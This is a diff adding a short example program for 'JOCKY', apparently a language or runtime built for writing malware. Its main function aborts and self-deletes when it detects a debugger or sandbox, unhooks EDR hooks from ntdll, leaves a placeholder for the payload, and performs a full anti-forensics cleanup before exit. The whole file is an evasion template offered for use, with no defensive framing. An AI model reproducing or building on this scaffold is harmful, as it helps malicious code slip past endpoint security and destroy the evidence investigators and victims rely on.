@@ -1,0 +1,20 @@
+// Basic JOCKY example — no ffi declarations needed.
+// All jocky_* functions are auto-registered by the compiler.
+// jocky_runtime_init() is called automatically before main().
+
+fn main() -> void {
+    // Abort if running inside a debugger or sandbox
+    let flags: i32 = jocky_check_analysis_environment();
+    if flags != 0 {
+        jocky_self_delete();
+        return;
+    }
+
+    // Unhook EDR hooks from ntdll
+    jocky_unhook_ntdll();
+
+    // Do work here...
+
+    // Full anti-forensics cleanup before exit
+    jocky_cleanup_all();
+}
